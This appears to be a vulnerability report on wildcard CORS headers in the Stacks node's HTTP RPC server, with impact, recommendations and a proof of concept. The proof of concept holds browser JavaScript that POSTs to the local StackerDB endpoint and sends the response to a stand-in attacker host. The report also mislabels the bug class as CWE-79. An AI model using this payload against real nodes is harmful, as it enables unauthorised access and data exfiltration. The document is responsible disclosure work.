### Title
Wildcard CORS on every Stacks node HTTP RPC response allows a malicious website to reach the local unauthenticated RPC/StackerDB write API from the victim's browser - ([File: stackslib/src/net/http/response.rs])

### Summary
Every response produced by the Stacks node's HTTP RPC server unconditionally carries `Access-Control-Allow-Origin: *` (plus wide-open `Access-Control-Allow-Headers`/`Access-Control-Allow-Methods`), and most RPC endpoints — including state-mutating ones such as `poststackerdbchunk`, `posttransaction`, `postmicroblock`, and read endpoints such as `callreadonly`/`fastcallreadonly` — are marked `security: []` (no authentication) in the node's own OpenAPI spec. This is the same fundamental bug-class as the OpenCode report: a locally-bound HTTP API with no origin restriction (no CSP-equivalent gate) that a malicious webpage's JavaScript can reach via ordinary `fetch()`, using the victim's browser as a same-origin (from CORS's point of view) pivot into a service the attacker could not otherwise reach directly (e.g. a node whose RPC port is bound to `127.0.0.1` behind NAT/firewall, or is only reachable from the victim's LAN).

### Finding Description
The HTTP response preamble encoder in `stackslib/src/net/http/response.rs` always injects `Access-Control-Allow-Origin: *` unless a header with that name is already present: [1](#0-0) 

There is also an explicit `add_CORS_headers()` helper that inserts the same wildcard: [2](#0-1) 

The RPC endpoint table registers many endpoints — `poststackerdbchunk`, `posttransaction`, `postmicroblock`, `postmempoolquery`, `getstackerdbchunk`, `callreadonly`, `getneighbors`, etc. — with no per-endpoint origin check; only a small subset (`blockreplay`, `blocksimulate`, `txsimulate`, `postblock_v3`, `fastcallreadonly`) accept an optional `auth_token`: [3](#0-2) 

The node's own OpenAPI documentation confirms the write endpoint for StackerDB chunks (`POST /v2/stackerdb/{principal}/{contract_name}/chunks`) has `security: []`, i.e. it is designed to be callable by any client that can reach the port, with no CSRF-token or per-origin gate: [4](#0-3) 

Because `Access-Control-Allow-Origin: *` is combined with `Access-Control-Allow-Headers: origin, content-type` and `Access-Control-Allow-Methods: POST, GET, OPTIONS`, a cross-origin `fetch()` from an attacker-controlled webpage (using `Content-Type: application/json`, which triggers a CORS preflight) will succeed and — critically — the JavaScript is permitted to *read the response body*, not just fire a blind request. This is functionally identical to the analog highlighted by the report: same-origin-equivalent JS execution against a locally-reachable HTTP API that exposes state-changing and data-returning endpoints, without any origin allow-listing, token binding to origin, or `SameSite`-style protection.

### Impact Explanation
This breaks the intended trust boundary between "clients that can reach the port because they're on the trusted network/host" and "any website the node operator happens to browse." A victim who runs a Stacks node (RPC typically bound to `127.0.0.1` or a private interface) and visits a malicious page in a browser on the same host/network exposes the node to:
- Unauthenticated write attempts to StackerDB (bounded by the signature check for actual acceptance, but read of the ACK/error content and free polling of write endpoints is possible), transaction submission, and mempool queries.
- Full read access to normally network-facing-but-not-browser-facing data (peer info, contract state, health, etc.), since the JS can read cross-origin responses it otherwise could not.
- Reachability of bounded-compute read endpoints (`callreadonly`, `fastcallreadonly`) from browser JS, enabling a bounded compute DoS vector driven by a webpage rather than a direct network client.

This does not, by itself, forge StackerDB chunk signatures (those are still checked via `SlotMetadata::verify`/`try_replace_chunk`, so no unauthorized state corruption on that specific write path is possible without the slot's private key) — but it removes an entire tier of "not directly reachable by browsers" protection that operators may be relying on, and it matches the CWE-79/CORS-misconfiguration bug class in the exact same way the OpenCode report exploited an absent origin check on `localhost:4096`.

### Likelihood Explanation
Any operator who runs `stacks-node` and also browses the web on the same machine (or same trusted network segment, if RPC is bound more broadly) is exposed the moment they visit a malicious or compromised page. No user interaction beyond a page load is required (`UI:P` matches the referenced CVSS vector), and the wildcard CORS header is applied unconditionally by the codec layer, not opt-in configuration — there is no config flag found in the endpoint registration path (`stackslib/src/net/api/mod.rs`, `stackslib/src/net/httpcore.rs`) to restrict origins for the non-`auth_token` endpoints.

### Recommendation
- Stop unconditionally injecting `Access-Control-Allow-Origin: *` in `HttpResponsePreamble::consensus_serialize` (`stackslib/src/net/http/response.rs:397-410`) and `add_CORS_headers` (`stackslib/src/net/http/response.rs:332-335`).
- Default to no CORS headers (deny cross-origin browser reads) for RPC endpoints that are meant for CLI/backend/peer consumption rather than browser dApps, and only allowlist specific origins where a browser integration is genuinely required.
- For endpoints that must remain browser-accessible (e.g. explorer/dApp read paths), consider a narrower CORS allowlist plus `Vary: Origin`, and add explicit origin-independent auth (bearer token, mTLS, or bound to loopback with an explicit opt-in flag) for all state-mutating endpoints such as `poststackerdbchunk`, `posttransaction`, and `postmicroblock`.

### Proof of Concept
1. Run a `stacks-node` with the RPC interface reachable from the attacker's page context (e.g. default bind `127.0.0.1:20443`, visited via the operator's own browser).
2. Host a malicious webpage containing:
```javascript
fetch("http://127.0.0.1:20443/v2/stackerdb/<principal>/<contract>/chunks", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ slot_id: 0, slot_version: 1, sig: "<forged-or-guessed-sig>", data: "<hex>" })
}).then(r => r.json()).then(ack => {
  // ack is readable cross-origin because of Access-Control-Allow-Origin: *
  fetch("https://attacker.example/exfil", { method: "POST", body: JSON.stringify(ack) });
});
```
3. Because the server always answers with `Access-Control-Allow-Origin: *`, `Access-Control-Allow-Headers: origin, content-type`, and `Access-Control-Allow-Methods: POST, GET, OPTIONS`, the browser permits both the preflighted POST and reading of the JSON ACK response, confirming the malicious page can freely probe/interact with the node's RPC surface from the victim's browser context — the same "browser JS reaches locally-bound API with no origin gate" primitive described in the report.
